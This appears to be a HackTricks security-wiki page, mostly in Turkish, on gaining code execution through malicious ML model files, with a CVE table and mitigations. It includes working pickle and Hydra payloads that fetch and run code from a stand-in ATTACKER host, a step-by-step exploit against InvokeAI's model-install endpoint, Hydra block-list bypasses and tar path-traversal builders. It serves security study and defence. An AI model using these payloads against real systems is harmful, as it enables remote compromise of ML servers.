# Modeller RCE

{{#include ../banners/hacktricks-training.md}}

## Modelleri RCE'ye yükleme

Makine Öğrenimi modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklı formatlarda paylaşılır. Bu modeller geliştiricilerin makinelerine veya production sistemlere yüklenip kullanılabilir. Genellikle modeller kötü amaçlı kod içermez, ancak model yükleme kütüphanesindeki bir zafiyet veya modelin amaçlanan bir özelliği nedeniyle modelin sistem üzerinde rastgele kod çalıştırmak için kullanılabildiği durumlar vardır.

Yazım zamanında bu tür zafiyetlere dair bazı örnekler şunlardır:

| **Çerçeve / Araç**        | **Zafiyet (CVE varsa)**                                                    | **RCE Vektörü**                                                                                                                           | **Referanslar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Güvensiz deserializasyon `torch.load` içinde* **(CVE-2025-32434)**                                                              | Model checkpoint'ındaki kötü amaçlı pickle kod yürütmeye yol açar (`weights_only` korumasını atlar)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kötü amaçlı model indirilmesi kod yürütmeye neden olur; yönetim API'sinde Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Güvensiz checkpoint deserializasyonu `torch.load` ile **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint `load_model_trainer_states_from_checkpoint` sırasında pickle reducer'ı tetikler → ML worker'da kod yürütme            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'den model yükleme `yaml.unsafe_load` kullanıyor (kod yürütme) <br> Lambda layer ile model yükleme rastgele Python kodu çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Hazırlanmış `.tflite` model integer overflow tetikleyerek → heap corruption (potansiyel RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` ile model yüklemek, saldırganın `__reduce__` payload'ını içeren pickle'ı çalıştırır                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *(itiraz edilmiş)*                                                                              | `numpy.load` varsayılan olarak pickled object dizilerine izin veriyordu – kötü amaçlı `.npy/.npz` kod yürütmeyi tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights yolu dizinden çıkabilir (rastgele dosyaları okuma) <br> Kötü amaçlı ONNX model tar'ı rastgele dosyaları üzerine yazabilir (RCE'ye yol açabilir) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Özel operator içeren model, saldırganın native kodunu yüklemeyi gerektirebilir; karmaşık model grafikleri mantığı suistimal ederek istenmeyen hesaplamaları çalıştırabilir   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkinken model-load API'si ile relatif path traversal'a izin vererek dosya yazmaya olanak sağlar (ör. `.bashrc` üzerine yazma ile RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Bozuk GGUF model dosyası parser'da heap buffer overflow'lara neden olarak hedef sistemde rastgele kod yürütmeye imkan verir                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Kötü amaçlı HDF5 (`.h5`) model Lambda layer ile yüklemede hala kod çalıştırır (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Birçok ML aracı (örn. pickle-tabanlı model formatları, Python `pickle.load`) model dosyalarına gömülü rastgele kodu çalıştırır, uygun önlemler alınmadıkça | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Güvenilmeyen metadata `hydra.utils.instantiate()`'a geçiriliyor **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Saldırgan kontrollü model metadata/config `_target_`'ı rastgele callable'a (örn. `builtins.exec`) ayarlar → yükleme sırasında çalıştırılır, “güvenli” formatlarda bile (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ayrıca, PyTorch tarafından kullanılanlar gibi bazı python pickle tabanlı modeller `weights_only=True` ile yüklenmezse sistemde rastgele kod çalıştırmak için kullanılabilir. Bu nedenle, tabloda listelenmemiş olsalar bile her türlü pickle tabanlı model bu tür saldırılara özellikle duyarlı olabilir.

### Hydra metadata → RCE (safetensors ile bile çalışır)

`hydra.utils.instantiate()` yapılandırma/metadata nesnesindeki herhangi bir nokta ile belirtilmiş `_target_`'ı import eder ve çağırır. Kütüphaneler `instantiate()`'a **güvenilmeyen model metadata** sağladığında, bir saldırgan callable ve argümanlar sağlayarak model yüklemesi sırasında anında çalıştırabilir (pickle gerekmez).

Payload örneği (şu yerlerde çalışır: `.nemo` `model_config.yaml`, repo `config.json`, veya `.safetensors` içindeki `__metadata__`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok loaders içinde model başlatılmadan önce tetiklenir.
- Hydra’nın string block-list’i alternatif import yolları (ör. `enum.bltns.eval`) veya uygulama tarafından çözümlenen isimler (ör. `nemo.core.classes.common.os.system` → `posix`) aracılığıyla aşılabilir.
- FlexTok ayrıca stringleştirilmiş metadata’yı `ast.literal_eval` ile parse eder; bu, Hydra çağrısından önce DoS (CPU/memory blowup) yapılmasına olanak tanır.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` Stable-Diffusion için popüler açık kaynaklı bir web arayüzüdür. Sürümler **5.3.1 – 5.4.2**, kullanıcıların modelleri rastgele URL’lerden indirip yüklemelerine izin veren `/api/v2/models/install` REST endpoint’ini açığa çıkarır.

İçeride endpoint eninde sonunda şu çağrıyı yapar:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### İstismar adım adım

1. Kötü amaçlı bir checkpoint oluşturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Kontrolünüzdeki bir HTTP sunucusunda `payload.ckpt` dosyasını barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Zafiyetli endpoint'i tetikleyin (kimlik doğrulama gerekmiyor):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayı indirirken `torch.load()` çağırılır → `os.system` gadget'ı çalışır ve saldırgan InvokeAI sürecinin bağlamında kod yürütmesi elde eder.

Ready-made exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag varsayılan **false**)  
•  `/api/v2/models/install` saldırgan tarafından erişilebilir  
•  Sürecin shell komutlarını çalıştırma izni var

#### Önlemler

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama `scan=True` varsayılanını ayarlar ve deserializasyondan önce malware taraması yapar.  
* Checkpoint'leri programatik olarak yüklerken `torch.load(file, weights_only=True)` kullanın veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper'ını kullanın.  
* Model kaynakları için allow-lists / imzaları uygulayın ve servisi en az ayrıcalıkla çalıştırın.

> ⚠️ Unutmayın ki **herhangi bir** Python pickle tabanlı format (çok sayıda `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) güvenilmeyen kaynaklardan deserialise edilmek için doğası gereği güvensizdir.

---

Aşağıda, daha eski InvokeAI sürümlerini bir reverse proxy arkasında çalıştırmak zorundaysanız uygulanabilecek ad-hoc bir hafifletme örneği:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’nin Transformers4Rec (Merlin'in bir parçası) kullanıcı tarafından sağlanan yollar üzerinde doğrudan `torch.load()` çağıran güvensiz bir checkpoint loader'ı açığa çıkardı. `torch.load` Python `pickle`'a dayandığı için, saldırgan kontrollü bir checkpoint seriden çıkarma sırasında bir reducer aracılığıyla keyfi kod çalıştırabilir.

Zayıf yol (düzeltme öncesi): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Neden bu RCE'ye yol açıyor: Python pickle'de bir nesne bir reducer (`__reduce__`/`__setstate__`) tanımlayıp callable ve argümanlar döndürebilir. Bu callable unpickling sırasında çalıştırılır. Eğer böyle bir nesne bir checkpoint'te bulunuyorsa, herhangi bir ağırlık kullanılmadan önce çalışır.

Minimal kötü amaçlı checkpoint örneği:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Teslim vektörleri ve blast radius:
- Repos, buckets veya artifact registries aracılığıyla paylaşılan Trojanized checkpoints/models
- Checkpoint'leri otomatik olarak yükleyen automated resume/deploy pipeline'ları
- Çalıştırma training/inference workers içinde gerçekleşir, genellikle yükseltilmiş ayrıcalıklarla (ör. containers içinde root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) doğrudan `torch.load()` çağrısını `transformers4rec/utils/serialization.py` içinde uygulanmış sınırlı, allow-listed bir deserializer ile değiştirdi. Yeni loader tipleri/alanları doğrular ve yükleme sırasında keyfi callables'ların tetiklenmesini engeller.

PyTorch checkpoints'e özgü savunma önerileri:
- Güvenilmeyen veriyi unpickle etmeyin. Mümkünse [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi yürütülebilir olmayan formatları tercih edin.
- Eğer PyTorch serialization kullanmak zorundaysanız, `weights_only=True` (yeni PyTorch sürümlerinde desteklenir) ayarının olduğundan emin olun veya Transformers4Rec yamasına benzer custom allow-listed bir unpickler kullanın.
- Model provenance/signatures'i zorunlu kılın ve sandbox deserialization uygulayın (seccomp/AppArmor; non-root kullanıcı; kısıtlı FS ve ağ çıkışı yok).
- Checkpoint yükleme sırasında ML servislerinden beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanımını takip edin.

POC ve vulnerable/patch referansları:
- Patch öncesi vulnerable loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Kötü amaçlı checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Patch sonrası loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Örnek – kötü amaçlı bir PyTorch modeli oluşturma

- Modeli oluştur:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yükle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD, kullanıcı kontrollü verileri deserializes eden bir `resnet` endpoint'i açığa çıkarıyor. ZDI, uzak bir saldırganın bir kurbana kötü amaçlı bir sayfa/dosya yüklemesi için zorlayabileceğini, bunun hazırlanmış serialized blob'u o endpoint'e itmesini sağlayabileceğini ve `root` olarak deserialization'ı tetikleyerek tam ele geçirmeye yol açtığını doğruladı.

Exploit akışı tipik pickle abuse'ını yansıtır:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Deserialization sırasında erişilebilen herhangi bir gadget (constructors, `__setstate__`, framework callbacks, etc.) aynı şekilde silahlandırılabilir; taşıma HTTP, WebSocket veya izlenen bir dizine bırakılan bir dosya olması fark etmez.


## Models to Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), farklı AI framework'leri tarafından kullanılan çoğu model formatı genellikle `.zip` gibi arşivlere dayanır. Bu nedenle, bu formatlar kötüye kullanılarak path traversal saldırıları gerçekleştirilebilir ve modelin yüklendiği sistemden rastgele dosyalar okunabilir.

Örneğin, aşağıdaki kod ile yüklenirken `/tmp` dizininde bir dosya oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Veya, aşağıdaki kodla yüklendiğinde `/tmp` dizinine symlink oluşturacak bir model yaratabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Derinlemesine inceleme: Keras .keras deserialization ve gadget hunting

.keras internals, Lambda-layer RCE, ≤ 3.8'deki arbitrary import issue ve allowlist içinde post-fix gadget discovery hakkında odaklı bir rehber için bakınız:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Kaynaklar

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
